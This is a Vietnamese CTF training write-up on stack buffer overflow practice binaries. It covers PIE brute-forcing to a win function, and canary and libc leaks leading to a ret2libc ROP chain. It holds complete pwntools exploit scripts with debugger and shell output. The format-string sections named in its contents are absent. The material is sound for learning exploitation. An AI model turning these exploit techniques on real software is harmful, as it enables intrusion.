# Training

## ***Buffer over flow***

- [brute Pie](#training-brute-pie)
- [leak Pie Canary](#training-leak-pie-canary)
- [leak with read](#training-leak-with-read)

## ***Format string***

- [say](#say)
- [log_printer](#log_printer)
- [chall1](#chall1) 
- [chall2](#chall2)



_______________________________________________________________________________________________________________________________

## training-brute-pie

[binary file and solve code](https://github.com/Hjn4Pwn/Pwn/tree/main/pwn_from_blabla/training/chall_bof/bof_noCanary)

### file

```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/bof_noCanary$ checksec bof_noCanary
[*] '/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/bof_noCanary/bof_noCanary'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled

hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/bof_noCanary$ file bof_noCanary
bof_noCanary: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6aac54d927d24c8ba8aba571154604d441400e74, for GNU/Linux 3.2.0, not stripped

```

### Source

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>


void vuln(char* s)
{
    char buf[0x20];
    if(strlen(s) > 0x40){
        puts("Buffer too long!!");
        _exit(-1);
    }
    memcpy(buf,s,strlen(s));
}

int main(int argc, char** argv, char** envp)
{
    if(argc != 2){
        printf("Usage: %s <buffer>\n", argv[0]);
        return -1;
    }
    if(strlen(argv[1]) > 0x40){
        puts("Buffer too long!!");
        return -1;
    }
    vuln(argv[1]);
    return 0;
}
void w1n(){
    char* argv[] = { ":))", NULL};
    execve("/bin/sh",argv,NULL);
}

```

Khi mà Pie được bật, thì trong đầu mình ban đầu chỉ có leak và leak. Cơ mà không khả thi khi mà muốn vào được **printf hay puts** cho việc leak thì đếu sẽ exit ngay sau đó. chẳng thể ghi đè return address nên chẳng có chuyện quay lại hàm main cho payload lấy shell, điều khiển luồng.

Cơ mà:

```shell
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000001000  _init
0x0000000000001090  __cxa_finalize@plt
0x00000000000010a0  _exit@plt
0x00000000000010b0  puts@plt
0x00000000000010c0  strlen@plt
0x00000000000010d0  printf@plt
0x00000000000010e0  execve@plt
0x00000000000010f0  memcpy@plt
0x0000000000001100  _start
0x0000000000001130  deregister_tm_clones
0x0000000000001160  register_tm_clones
0x00000000000011a0  __do_global_dtors_aux
0x00000000000011e0  frame_dummy
0x00000000000011e9  vuln
0x0000000000001249  main
0x00000000000012d4  w1n
0x0000000000001314  _fini

```

cơ chế của pie thì kiểu như libc, libc_base sẽ thay đổi mỗi khi run binary, trong khi đó offset thì không. thêm nữa, pie_base sẽ có 3 bit cuối = 0. Vậy nên khi mà pie_base + offset với offset như trên thì 3 bits cuối của addr sẽ không khác 3 bits cuối của offset với hàm tường ứng.

Ví dụ **w1n** có offset là **0x12d4** thì địa chỉ của hàm **w1n** sau khi run binary (đã cộng pie_base) sẽ 0x??..??**?2d4**. Còn bit thứ 4 của offset sẽ được cộng vào.EX:

addr sau khi run binary

```shell
0x00005555555551e9  vuln
0x0000555555555249  main
0x00005555555552d4  w1n

```

pie_base lúc này sẽ là ***0x0000555555554000*** nên là ta có thể bruteforce với việc thay vì gửi cả addr win func để overwrite return addr, thì giờ chỉ cần gửi 4 bits tức 2 bytes cuối thoi, tỷ lệ là 1/16 (**?2d4**).

Phần exploit mình sẽ chọn gửi luôn ***0x52d4*** gửi nào mà vừa khớp với pie_base có 4 bits cuối là **4**000 thì okela.

### exploit code

```python
from pwn import *

w1n_addr = 0x52d4
payload = b"a" * 40 + p16(w1n_addr)

while True:
    r = process(['./bof_noCanary', payload])
    r.send(b'ls;cat flag.txt')
    r.interactive()

```

### result

*Có 1 vấn đề là hmmm script này mình vẫn chưa biết cách để auto, chứ phím enter cũng sml với mình lắm =="*

```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/bof_noCanary$ python3 exploit.py
[+] Starting local process './bof_noCanary': pid 6787
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Process './bof_noCanary' stopped with exit code -11 (SIGSEGV) (pid 6787)
[*] Got EOF while sending in interactive
[+] Starting local process './bof_noCanary': pid 6790
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Process './bof_noCanary' stopped with exit code -11 (SIGSEGV) (pid 6790)
[*] Got EOF while sending in interactive
[+] Starting local process './bof_noCanary': pid 6799
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Process './bof_noCanary' stopped with exit code -11 (SIGSEGV) (pid 6799)
[*] Got EOF while sending in interactive
[+] Starting local process './bof_noCanary': pid 6802
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Process './bof_noCanary' stopped with exit code -11 (SIGSEGV) (pid 6802)
[*] Got EOF while sending in interactive
[+] Starting local process './bof_noCanary': pid 6805
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Process './bof_noCanary' stopped with exit code -11 (SIGSEGV) (pid 6805)
[*] Got EOF while sending in interactive
[+] Starting local process './bof_noCanary': pid 6808
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Process './bof_noCanary' stopped with exit code -11 (SIGSEGV) (pid 6808)
[*] Got EOF while sending in interactive
[+] Starting local process './bof_noCanary': pid 6811
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Process './bof_noCanary' stopped with exit code -11 (SIGSEGV) (pid 6811)
[*] Got EOF while sending in interactive
[+] Starting local process './bof_noCanary': pid 6814
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Process './bof_noCanary' stopped with exit code -11 (SIGSEGV) (pid 6814)
[*] Got EOF while sending in interactive
[+] Starting local process './bof_noCanary': pid 6817
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Process './bof_noCanary' stopped with exit code -11 (SIGSEGV) (pid 6817)
[*] Got EOF while sending in interactive
[+] Starting local process './bof_noCanary': pid 6820
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Process './bof_noCanary' stopped with exit code -11 (SIGSEGV) (pid 6820)
[*] Got EOF while sending in interactive
[+] Starting local process './bof_noCanary': pid 6823
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Process './bof_noCanary' stopped with exit code -11 (SIGSEGV) (pid 6823)
[*] Got EOF while sending in interactive
[+] Starting local process './bof_noCanary': pid 6832
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Process './bof_noCanary' stopped with exit code -11 (SIGSEGV) (pid 6832)
[*] Got EOF while sending in interactive
[+] Starting local process './bof_noCanary': pid 6835
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Process './bof_noCanary' stopped with exit code -11 (SIGSEGV) (pid 6835)
[*] Got EOF while sending in interactive
[+] Starting local process './bof_noCanary': pid 6838
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Process './bof_noCanary' stopped with exit code -11 (SIGSEGV) (pid 6838)
[*] Got EOF while sending in interactive
[+] Starting local process './bof_noCanary': pid 6841
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Process './bof_noCanary' stopped with exit code -11 (SIGSEGV) (pid 6841)
[*] Got EOF while sending in interactive
[+] Starting local process './bof_noCanary': pid 6844
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Process './bof_noCanary' stopped with exit code -11 (SIGSEGV) (pid 6844)
[*] Got EOF while sending in interactive
[+] Starting local process './bof_noCanary': pid 6847
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Process './bof_noCanary' stopped with exit code -11 (SIGSEGV) (pid 6847)
[*] Got EOF while sending in interactive
[+] Starting local process './bof_noCanary': pid 6850
[*] Switching to interactive mode
$
bof.c  bof_noCanary  core  exploit.py  flag.txt  haiz.py  payload.txt
flag{l0ca1_fl4g_but_w3_w0n}

```



_______________________________________________________________________________________________________________________________

## training-leak-with-read

[binary file and solve code](https://github.com/Hjn4Pwn/Pwn/tree/main/pwn_from_blabla/training/chall_bof/passStore_NOPIE)

### file

```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_NOPIE$ checksec passStore_NOPIE
[*] '/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_NOPIE/passStore_NOPIE'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_NOPIE$ file passStore_NOPIE
passStore_NOPIE: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7110eba217e2f468c9b3c94091bf86bdda5d5d33, for GNU/Linux 3.2.0, not stripped

```

### IDA

#### main func

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  passStore();
  return 0;
}

```

#### passStore func

```c
unsigned __int64 passStore()
{
  char buf[56]; // [rsp+0h] [rbp-40h] BYREF
  unsigned __int64 v2; // [rsp+38h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("Type the password: ");
  read(0, buf, 0x300uLL);
  printf("You typed %s\n", buf);
  printf("Retype: ");
  read(0, buf, 0x300uLL);
  return v2 - __readfsqword(0x28u);
}

```

Oke, ở đây ta có 2 lần nhập, với *read*, no pie, canary enable => leak thứ gì đấy.

Thì đầu tiên, mình sẽ leak canary trước cái đã rồi tính tiếp.

```shell
pwndbg> b* passStore + 91
Breakpoint 2 at 0x4011ff
pwndbg> c
Continuing.
Type the password: aaaaaaaaaaaaa

Breakpoint 2, 0x00000000004011ff in passStore ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────
*RAX  0x0
 RBX  0x0
*RCX  0x7ffff7ea1992 (read+18) ◂— cmp rax, -0x1000 /* 'H=' */
*RDX  0x300
*RDI  0x402018 ◂— 'You typed %s\n'
*RSI  0x7fffffffdfb0 ◂— 'aaaaaaaaaaaaa\n'
*R8   0x13
 R9   0x7ffff7fc9040 (_dl_fini) ◂— endbr64
*R10  0x7ffff7d935e8 ◂— 0xf001200001a64
*R11  0x246
 R12  0x7fffffffe118 —▸ 0x7fffffffe35f ◂— '/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_NOPIE/passStore_NOPIE'
 R13  0x401245 (main) ◂— endbr64
 R14  0x403e18 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401160 (__do_global_dtors_aux) ◂— endbr64
 R15  0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0x0
*RBP  0x7fffffffdff0 —▸ 0x7fffffffe000 ◂— 0x1
*RSP  0x7fffffffdfb0 ◂— 'aaaaaaaaaaaaa\n'
*RIP  0x4011ff (passStore+91) ◂— call 0x401090
──────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────
 ► 0x4011ff <passStore+91>     call   printf@plt                      <printf@plt>
        format: 0x402018 ◂— 'You typed %s\n'
        vararg: 0x7fffffffdfb0 ◂— 'aaaaaaaaaaaaa\n'

   0x401204 <passStore+96>     lea    rax, [rip + 0xe1b]
   0x40120b <passStore+103>    mov    rdi, rax
   0x40120e <passStore+106>    mov    eax, 0
   0x401213 <passStore+111>    call   printf@plt                      <printf@plt>

   0x401218 <passStore+116>    lea    rax, [rbp - 0x40]
   0x40121c <passStore+120>    mov    edx, 0x300
   0x401221 <passStore+125>    mov    rsi, rax
   0x401224 <passStore+128>    mov    edi, 0
   0x401229 <passStore+133>    call   read@plt                      <read@plt>

   0x40122e <passStore+138>    nop
───────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────
00:0000│ rsi rsp 0x7fffffffdfb0 ◂— 'aaaaaaaaaaaaa\n'
01:0008│         0x7fffffffdfb8 ◂— 0xa6161616161 /* 'aaaaa\n' */
02:0010│         0x7fffffffdfc0 —▸ 0x7ffff7fa7780 (_IO_2_1_stdout_) ◂— 0xfbad2887
03:0018│         0x7fffffffdfc8 —▸ 0x7ffff7e0e5ff (setbuffer+191) ◂— test dword ptr [rbx], 0x8000
04:0020│         0x7fffffffdfd0 ◂— 0x0
05:0028│         0x7fffffffdfd8 ◂— 0x0
06:0030│         0x7fffffffdfe0 —▸ 0x7fffffffe000 ◂— 0x1
07:0038│         0x7fffffffdfe8 ◂— 0x7b1aaee79b5cb100
─────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────
 ► 0         0x4011ff passStore+91
   1         0x40127f main+58
   2   0x7ffff7db6d90 __libc_start_call_main+128
   3   0x7ffff7db6e40 __libc_start_main+128
   4         0x4010d5 _start+37
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> canary
AT_RANDOM = 0x7fffffffe339 # points to (not masked) global canary value
Canary    = 0x7b1aaee79b5cb100 (may be incorrect on != glibc)
Found valid canaries on the stacks:
00:0000│  0x7fffffffdfe8 ◂— 0x7b1aaee79b5cb100
00:0000│  0x7fffffffe098 ◂— 0x7b1aaee79b5cb100
pwndbg>

```

t thấy là canary ở ngay dưới vị trí stack lưu chuỗi của mình, cách 7 stacks, tức là 7*8 = 56 bytes, thế thì chỉ cần nhập 56 bytes, theo cơ chế của **read** thì chưa gặp byte null là nó chưa dừng lại, vì yêu cứ đâm đầu í. Nên khi mà mình nhập vào 56 bytes, tới ngay cái vị trí của thg canary, ở đấy làm gì có null. thế là ẻm dính luôn với thg buf, lún printf ra thì đi theo buf luôn, tới cuối mơí gặp null.

Oke vậy thì chốt lại là với ***payload = b"a"*56*** ta sẽ leak được canary. sau khi leak được rồi thì với payload thứ 2, ta sẽ điều khiển luồng thực thi của chương trình. tuy nhiên có 2 thứ: 1 là ret cách str ta nhập vào mấy bytes, 2 là ret đi đâu.

```shell
► 0x401229 <passStore+133>    call   read@plt                      <read@plt>
        fd: 0x0 (/dev/pts/0)
        buf: 0x7fffffffdfb0 ◂— 0x7fff0a333231
        nbytes: 0x300
```

string ta nhập sẽ được lưu ở buf :**0x7fffffffdfb0**

```shell
──────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────
 ► 0x401244       <passStore+160>                 ret                                  <0x40127f; main+58>
    ↓
   0x40127f       <main+58>                       mov    eax, 0
   0x401284       <main+63>                       pop    rbp
   0x401285       <main+64>                       ret
    ↓
   0x7ffff7db6d90 <__libc_start_call_main+128>    mov    edi, eax
   0x7ffff7db6d92 <__libc_start_call_main+130>    call   exit                <exit>

   0x7ffff7db6d97 <__libc_start_call_main+135>    call   __nptl_deallocate_tsd                <__nptl_deallocate_tsd>

   0x7ffff7db6d9c <__libc_start_call_main+140>    lock dec dword ptr [rip + 0x1ef505]  <__nptl_nthreads>
   0x7ffff7db6da3 <__libc_start_call_main+147>    sete   al
   0x7ffff7db6da6 <__libc_start_call_main+150>    test   al, al
   0x7ffff7db6da8 <__libc_start_call_main+152>    jne    __libc_start_call_main+168                <__libc_start_call_main+168>
───────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdff8 —▸ 0x40127f (main+58) ◂— mov eax, 0
01:0008│ rbp 0x7fffffffe000 ◂— 0x1
02:0010│     0x7fffffffe008 —▸ 0x7ffff7db6d90 (__libc_start_call_main+128) ◂— mov edi, eax
03:0018│     0x7fffffffe010 ◂— 0x0

```

Còn ret: **0x7fffffffdff8**

```python
>>> 0x7fffffffdff8 - 0x7fffffffdfb0
72

```

Ta thấy là mới chỉ có mỗi canary, còn phải viết ovwr về đâu, mình thử vào xem các gadget có gì okela k:

```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_NOPIE$ ROPgadget --binary passStore_NOPIE
Gadgets information
============================================================
0x000000000040110b : add bh, bh ; loopne 0x401175 ; nop ; ret
0x00000000004010dc : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; ret
0x0000000000401280 : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x0000000000401036 : add byte ptr [rax], al ; add dl, dh ; jmp 0x401020
0x000000000040117a : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004010de : add byte ptr [rax], al ; endbr64 ; ret
0x0000000000401282 : add byte ptr [rax], al ; pop rbp ; ret
0x000000000040100d : add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax
0x000000000040123b : add byte ptr [rbp + rax - 0x18], dh ; sub eax, 0xc9fffffe ; ret
0x000000000040117b : add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000401179 : add byte ptr cs:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040110a : add dil, dil ; loopne 0x401175 ; nop ; ret
0x0000000000401038 : add dl, dh ; jmp 0x401020
0x000000000040117c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401177 : add eax, 0x2eeb ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040123d : add eax, 0xfffe2de8 ; dec ecx ; ret
0x0000000000401017 : add esp, 8 ; ret
0x0000000000401016 : add rsp, 8 ; ret
0x000000000040103e : call qword ptr [rax - 0x5e1f00d]
0x000000000040122d : call qword ptr [rax - 0x7ba74b8]
0x0000000000401014 : call rax
0x0000000000401193 : cli ; jmp 0x401120
0x0000000000401199 : cli ; push rbp ; mov rbp, rsp ; push rdi ; pop rdi ; ret
0x00000000004010e3 : cli ; ret
0x000000000040128b : cli ; sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401242 : dec ecx ; ret
0x0000000000401190 : endbr64 ; jmp 0x401120
0x00000000004010e0 : endbr64 ; ret
0x000000000040119d : in eax, 0x57 ; pop rdi ; ret
0x0000000000401012 : je 0x401016 ; call rax
0x0000000000401105 : je 0x401110 ; mov edi, 0x404048 ; jmp rax
0x0000000000401147 : je 0x401150 ; mov edi, 0x404048 ; jmp rax
0x000000000040103a : jmp 0x401020
0x0000000000401194 : jmp 0x401120
0x0000000000401178 : jmp 0x4011a8
0x000000000040100b : jmp 0x4840103f
0x000000000040110c : jmp rax
0x0000000000401243 : leave ; ret
0x000000000040110d : loopne 0x401175 ; nop ; ret
0x0000000000401176 : mov byte ptr [rip + 0x2eeb], 1 ; pop rbp ; ret
0x000000000040127f : mov eax, 0 ; pop rbp ; ret
0x000000000040119c : mov ebp, esp ; push rdi ; pop rdi ; ret
0x0000000000401107 : mov edi, 0x404048 ; jmp rax
0x000000000040119b : mov rbp, rsp ; push rdi ; pop rdi ; ret
0x00000000004011a1 : nop ; pop rbp ; ret
0x000000000040110f : nop ; ret
0x000000000040118c : nop dword ptr [rax] ; endbr64 ; jmp 0x401120
0x0000000000401106 : or dword ptr [rdi + 0x404048], edi ; jmp rax
0x000000000040117d : pop rbp ; ret
0x000000000040119f : pop rdi ; ret
0x000000000040119a : push rbp ; mov rbp, rsp ; push rdi ; pop rdi ; ret
0x000000000040119e : push rdi ; pop rdi ; ret
0x000000000040101a : ret
0x0000000000401011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x000000000040105b : sar edi, 0xff ; call qword ptr [rax - 0x5e1f00d]
0x000000000040123f : sub eax, 0xc9fffffe ; ret
0x000000000040128d : sub esp, 8 ; add rsp, 8 ; ret
0x000000000040128c : sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax
0x0000000000401103 : test eax, eax ; je 0x401110 ; mov edi, 0x404048 ; jmp rax
0x0000000000401145 : test eax, eax ; je 0x401150 ; mov edi, 0x404048 ; jmp rax
0x000000000040100f : test rax, rax ; je 0x401016 ; call rax


```

đáng ra để gọi shell ở đây thì mình sẽ cần :

```shell
mov qword ptr [r14], r15 ; ret
systemcall

```
Để gọi shell. hay nếu dùng libc thì có thể leak runtime address với **printf(%s)** tuy nhiên cần đưa địa chỉ got của func vào rsi, do rdi trỏ đến "%s", nhưng chả có gadget nào để **pop rsi**.

Cơ mà mình nghĩ đến việc, có thể leak địa chỉ trên stack với **%p%p%p%p%p**, cơ mà với mục đích tương tự thì ta có thể làm với **read**. Nên mình sẽ vào check stack xem có địa chỉ hàm nào k.

```shell
pwndbg> stack 100
00:0000│ rax rsi rsp 0x7fffffffdfb0 —▸ 0x7ffff7fa3600 (_IO_file_jumps) ◂— 0x0
01:0008│             0x7fffffffdfb8 —▸ 0x7ffff7e1762d (_IO_file_setbuf+13) ◂— test rax, rax
02:0010│             0x7fffffffdfc0 —▸ 0x7ffff7fa7780 (_IO_2_1_stdout_) ◂— 0xfbad2887
03:0018│             0x7fffffffdfc8 —▸ 0x7ffff7e0e5ff (setbuffer+191) ◂— test dword ptr [rbx], 0x8000
04:0020│             0x7fffffffdfd0 ◂— 0x0
05:0028│             0x7fffffffdfd8 ◂— 0x0
06:0030│             0x7fffffffdfe0 —▸ 0x7fffffffe000 ◂— 0x1
07:0038│             0x7fffffffdfe8 ◂— 0xc2e8a41c66979000
08:0040│ rbp         0x7fffffffdff0 —▸ 0x7fffffffe000 ◂— 0x1
09:0048│             0x7fffffffdff8 —▸ 0x40127f (main+58) ◂— mov eax, 0
0a:0050│             0x7fffffffe000 ◂— 0x1
0b:0058│             0x7fffffffe008 —▸ 0x7ffff7db6d90 (__libc_start_call_main+128) ◂— mov edi, eax
0c:0060│             0x7fffffffe010 ◂— 0x0
0d:0068│             0x7fffffffe018 —▸ 0x401245 (main) ◂— endbr64
0e:0070│             0x7fffffffe020 ◂— 0x100000000
0f:0078│             0x7fffffffe028 —▸ 0x7fffffffe118 —▸ 0x7fffffffe35f ◂— '/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_NOPIE/passStore_NOPIE'
10:0080│             0x7fffffffe030 ◂— 0x0
11:0088│             0x7fffffffe038 ◂— 0x684f04992bfd6bfd
12:0090│             0x7fffffffe040 —▸ 0x7fffffffe118 —▸ 0x7fffffffe35f ◂— '/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_NOPIE/passStore_NOPIE'
13:0098│             0x7fffffffe048 —▸ 0x401245 (main) ◂— endbr64

```

thì mình để ý thấy có thằng **setbuffer+191** chỉ cần nhập 24 bytes là tới, nên là chỉ việc leak ra xong trừ đi 191 là ra được địa chỉ hàm ngon lành. Cơ mà có 1 vấn đề. Hơi khó hiểu tí, là lúc này thì là **+191** nhưng lúc mình viết script xong attach gdb vào chạy vào **x/s** địa chỉ được leak ra thì nó là **+150** nên trong script thay vì **-191** thì mình **-150** tức là **0x96**

Sau khi leak được runtime address của hàm **setbuffer**, thì mình có thể tính được **libc_base = addr_setbuf - setbuf_offset**. Sau đó tính addr của **system, "/bin/sh"** dưạ trên offset và libc_base. Xong rồi thì với lần nhập tiếp theo mình sẽ gửi payload nhầm lấy shell như sau:

**payload = ***bypass canary*** + ret + pop_rdi_ret + binsh_addr + system_addr**

đưa addr của chuỗi /bin/sh vào rdi làm tham số thứ 1 và gọi system. tuy nhiên đây là kiến trúc 64bits nên là cần ret trước đó để tránh lỗi movaps:

> The MOVAPS issue
>
>> If you're segfaulting on a movaps instruction in buffered_vfprintf() or do_system() in the x86_64 challenges, then ensure the stack is 16-byte aligned before returning to GLIBC functions such as printf() or system(). Some versions of GLIBC uses movaps instructions to move data onto the stack in certain functions. The 64 bit calling convention requires the stack to be 16-byte aligned before a call instruction but this is easily violated during ROP chain execution, causing all further calls from that function to be made with a misaligned stack. movaps triggers a general protection fault when operating on unaligned data, so try padding your ROP chain with an extra ret before returning into a function or return further into a function to skip a push instruction.


Chúng ta có thể dùng các tool dưới cho việc tìm offset, ropgadget cần thiết, tuy nhiên ở script của mình sẽ tối ưu hóa hơn với pwntools:

```shell
ROPgadget --binary file | grep "somthing"
readelf -sW /usr/lib/x86_64-linux-gnu/libc.so.6 | grep "system"
strings -tw /usr/lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"

```

### Exploit code

#### Exploit code ver1


```python
from pwn import *

binary = ELF('./passStore_NOPIE')
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
rop = ROP(binary)
r = process(binary.path)
#gdb.attach(r , api=True)

payload1 = b"a"*56
r.sendlineafter(b"Type the password: ",payload1)

r.recvline()

canary = b"\x00"  +  r.recv(7).split(b"\n")[0] 
canary += b"\x00"*(8 - len(canary))
log.info("Leaked canary: " + str(hex(u64(canary))))

main = binary.symbols['main'] 
ret = rop.find_gadget(['ret'])[0] 


payload2 = b"a"*56 + p64(u64(canary)) + b"a"*8 + p64(main+53)
r.sendlineafter(b"Retype: ",payload2)

payload3 = b"a"*248
r.sendlineafter(b"Type the password:",payload3)
r.recvline()

res = r.recv().split(b"\nRetype")[0] 
res += b"\x00"*(8 - len(res))
leak = (u64(res) << 8) + 0x0a 
_libc_start_main_addr = leak - 0x4a 
libc_base = _libc_start_main_addr - libc.symbols['__libc_start_main']
log.info("libc base addr : " + hex(libc_base)) 


system_offset = libc.symbols['system'] #
binsh_offset = next(libc.search(b'/bin/sh\x00'))
pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret'])[0]

system_addr = libc_base + system_offset
binsh_addr = libc_base + binsh_offset
log.info("system addr : " + hex(system_addr)) 
log.info("/bin/sh addr : " + hex(binsh_addr)) 

junk = b"a"*56 + p64(u64(canary)) + b"a"*8 
payload4 = junk +p64(ret)+ p64(pop_rdi_ret) + p64(binsh_addr) +p64(system_addr)

r.sendline(payload4)

r.interactive()

```

#### Result ver1

```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_NOPIE$ python3 exploit.py
[*] '/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_NOPIE/passStore_NOPIE'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/usr/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loaded 6 cached gadgets for './passStore_NOPIE'
[+] Starting local process '/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_NOPIE/passStore_NOPIE': pid 25200
[*] Leaked canary: 0xa5bb53678c3c3100
[*] libc base addr : 0x7f8adb24b000
[*] system addr : 0x7f8adb29bd60
[*] /bin/sh addr : 0x7f8adb423698
[*] Switching to interactive mode
$ ls
core  exploit.py  leak.py  passStore_NOPIE

```


#### Exploit code ver2

```python
from pwn import *

binary = ELF('./passStore_NOPIE')
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
rop = ROP(binary)
r = process(binary.path)
#gdb.attach(r , api=True)

#payload leak canary
payload1 = b"a"*56
r.sendline(payload1)

print(r.recvline())

canary = b"\x00"  +  r.recv(7).split(b"\n")[0] 
canary += b"\x00"*(8 - len(canary))
log.info("Leaked canary: " + str(hex(u64(canary))))

main = binary.symbols['main'] #0x0000000000401245
ret = rop.find_gadget(['ret'])[0] #0x000000000040101a

#payload to call main again
payload2 = b"a"*56 + p64(u64(canary)) + b"a"*8 + p64(ret) + p64(main)
r.sendlineafter(b"Retype: ",payload2)

#payload leak runtime address, to cal libc_base
payload3 = b"a"*23
r.sendlineafter(b"Type the password:",payload3)
print(r.recvline())

res = r.recv().split(b"\nRetype")[0].strip().ljust(8,b"\x00")

print(str(hex(u64(res))))

leaked_runtime_addr = u64(res) - 0x96 #setbuf
leaked_offset = libc.symbols['_IO_setbuffer'] #0x0000000000081540

libc_base = leaked_runtime_addr - leaked_offset
log.info("libc base addr : " + hex(leaked_runtime_addr))  


system_offset = libc.symbols['system'] #0x0000000000050d60
binsh_offset = next(libc.search(b'/bin/sh\x00'))
pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret'])[0]

system_addr = libc_base + system_offset
binsh_addr = libc_base + binsh_offset

# payload get shell
junk = b"a"*56 + p64(u64(canary)) + b"a"*8 
payload4 = junk +p64(ret)+ p64(pop_rdi_ret) + p64(binsh_addr) +p64(system_addr)

r.sendline(payload4)

r.interactive()
```

#### Result ver2

```shell
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_NOPIE$ python3 exploit.py
[*] '/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_NOPIE/passStore_NOPIE'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/usr/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loaded 6 cached gadgets for './passStore_NOPIE'
[+] Starting local process '/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_NOPIE/passStore_NOPIE': pid 17374
b'Type the password: You typed aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n'
[*] Leaked canary: 0x67c9f3b50b8b5800
b' You typed aaaaaaaaaaaaaaaaaaaaaaa\n'
0x7fe66ea595d6
[*] libc base addr : 0x7fe66ea59540
